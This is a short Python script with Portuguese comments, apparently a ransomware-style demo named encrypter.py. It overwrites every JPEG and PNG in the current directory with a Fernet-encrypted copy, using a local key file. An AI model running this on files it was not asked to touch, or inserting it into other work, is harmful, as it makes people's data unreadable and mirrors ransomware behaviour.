import os 
from cryptography.fernet import Fernet


# Ira realizar a operação para buscar os bytes do arquivo
def buscar_bytes(arquivo):
    try:
        with open(arquivo, "rb") as f:
            bytes_file = f.read()
        return bytes_file
    except IOError as e:
        print(f"Não foi possivel realizar a opoeração")

# Função para encryptar arquivo. 
# Ira realizar a busca da chave e 
# realizará a operação para encryptar
def encryptar(arquivo):
    try:
        with open("key.key", "rb") as f:
            key_pass = f.read()      

        fernet =  Fernet(key_pass)
        arquivo_bytes = buscar_bytes(arquivo)
        enc_arquivo = fernet.encrypt(arquivo_bytes)

        with open(arquivo, "wb") as f:
            f.write(enc_arquivo)
    except Exception as e:
        print(f"Não foi possivel realizar a operação {e}")


# for loop para listar os arquivos que estão na dir 
for arquivo in os.listdir():
    if arquivo == "encrypter.py" or arquivo == "decrypter.py":
        continue
    if arquivo.endswith("jpeg") or arquivo.endswith("png"):
        encryptar(arquivo)

os.system("clear")        
print("A operação ocorreu com sucesso")